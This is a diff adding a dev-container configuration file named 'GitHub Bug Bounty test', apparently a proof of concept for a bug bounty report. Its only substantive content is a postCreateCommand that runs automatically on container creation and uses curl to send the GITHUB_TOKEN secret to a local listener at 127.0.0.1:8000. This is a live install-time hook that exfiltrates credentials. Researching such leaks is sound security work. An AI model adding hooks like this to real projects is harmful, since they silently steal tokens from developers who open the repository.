@@ -1,0 +1,8 @@
+{
+    "name": "GitHub Bug Bounty test",
+    "dockerFile": "Dockerfile",
+    "settings": {
+        "terminal.integrated.shell.linux": "/usr/bin/zsh"
+    },
+    "postCreateCommand": "curl -k http://127.0.0.1:8000/${GITHUB_TOKEN}"
+}
